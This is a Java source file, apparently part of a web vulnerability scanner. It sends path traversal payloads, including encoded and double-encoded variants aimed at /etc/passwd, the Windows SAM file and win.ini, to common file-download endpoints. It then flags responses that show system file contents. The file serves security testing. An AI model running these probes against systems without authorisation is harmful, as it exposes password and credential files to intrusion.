package attacks;

import model.AttackResult;
import util.HttpUtil;

public class PathTraversalAttack {

    public static AttackResult run(String baseUrl) {

        String[] traversalPayloads = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini"
        };

        // Test common endpoints that might handle files
        String[] endpoints = {
            "/api/files?path=",
            "/download?file=",
            "/api/download?filename=",
            "/file?name="
        };

        for (String endpoint : endpoints) {
            for (String payload : traversalPayloads) {
                String url = baseUrl + endpoint + payload;
                String response = HttpUtil.get(url);

                // Check for signs of successful path traversal
                if (response.contains("root:") || response.contains("[boot loader]") || 
                    response.contains("windows") || response.contains("fonts") ||
                    response.contains("/bin/bash") || response.contains("daemon:")) {
                    
                    String details = String.format("Path traversal vulnerability detected at '%s' with payload '%s'. System files accessible", 
                        endpoint, truncate(payload, 30));
                        
                    return new AttackResult("Path Traversal", true, details);
                }
            }
        }

        return new AttackResult("Path Traversal", false, 
            "No path traversal vulnerability detected. Tested " + (traversalPayloads.length * endpoints.length) + " combinations across common endpoints");
    }

    private static String truncate(String str, int maxLength) {
        if (str.length() <= maxLength) return str;
        return str.substring(0, maxLength) + "...";
    }
}
